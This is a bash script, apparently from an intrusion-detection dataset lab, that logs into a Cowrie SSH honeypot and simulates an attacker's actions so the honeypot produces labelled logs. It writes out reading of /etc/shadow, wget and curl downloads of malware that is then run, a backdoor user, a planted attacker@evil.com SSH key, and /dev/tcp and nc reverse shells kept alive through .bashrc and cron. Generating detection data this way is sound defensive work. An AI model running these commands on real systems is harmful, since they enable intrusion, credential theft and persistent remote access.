#!/bin/bash
# 시나리오 05: 침투 후 명령어 실행
# Label: Intrusion / Malware
# 도구: SSH 직접 접속
# 설명: Cowrie에 SSH 로그인 후 공격자 명령어 실행 시뮬레이션
# (Cowrie는 실제 실행 없이 명령어를 로그에 기록)

LABEL="Intrusion"
SCENARIO="post_intrusion"
echo "{\"scenario\": \"${SCENARIO}\", \"label\": \"${LABEL}\", \"event\": \"start\", \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"}"

SSH_OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -p 2222"

# root 계정으로 침투 후 시스템 정찰 명령어
echo "[*] Post-intrusion commands as root"
sshpass -p "password" ssh $SSH_OPTS root@172.30.0.10 << 'ENDSSH' 2>/dev/null || \
ssh $SSH_OPTS -o PasswordAuthentication=yes root@172.30.0.10 <<< $'password\n' 2>/dev/null || true
uname -a
whoami
id
cat /etc/passwd
cat /etc/shadow
cat /etc/hosts
ls -la /
ls -la /home
ls -la /tmp
ls -la /var
ps aux
netstat -an
ifconfig
arp -a
env
history
last
w
who
df -h
free -m
cat /proc/version
cat /proc/cpuinfo
find / -perm -4000 -type f 2>/dev/null
ENDSSH

# 악성코드 다운로드 시뮬레이션 (has_wget, has_curl 피처 생성)
echo "[*] Malware download simulation as admin"
sshpass -p "admin" ssh $SSH_OPTS admin@172.30.0.10 << 'ENDSSH' 2>/dev/null || true
wget http://172.30.0.20:8888/malware.sh -O /tmp/malware.sh
curl http://172.30.0.20:8888/payload.bin -o /tmp/payload.bin
curl -s http://172.30.0.20:8888/backdoor.py -o /tmp/backdoor.py
chmod +x /tmp/malware.sh
/tmp/malware.sh
echo "* * * * * root /tmp/malware.sh" >> /etc/crontab
crontab -l
useradd -m -s /bin/bash backdoor
echo "backdoor:b@ckd00r123" | chpasswd
ENDSSH

# 지속성 확보 시뮬레이션
echo "[*] Persistence mechanisms as pi"
sshpass -p "raspberry" ssh $SSH_OPTS pi@172.30.0.10 << 'ENDSSH' 2>/dev/null || true
mkdir -p ~/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... attacker@evil.com" >> ~/.ssh/authorized_keys
echo "/bin/bash -i >& /dev/tcp/172.30.0.20/4444 0>&1" >> ~/.bashrc
(crontab -l; echo "*/5 * * * * nc 172.30.0.20 4444 -e /bin/bash") | crontab -
ENDSSH

echo "{\"scenario\": \"${SCENARIO}\", \"label\": \"${LABEL}\", \"event\": \"end\", \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"}"
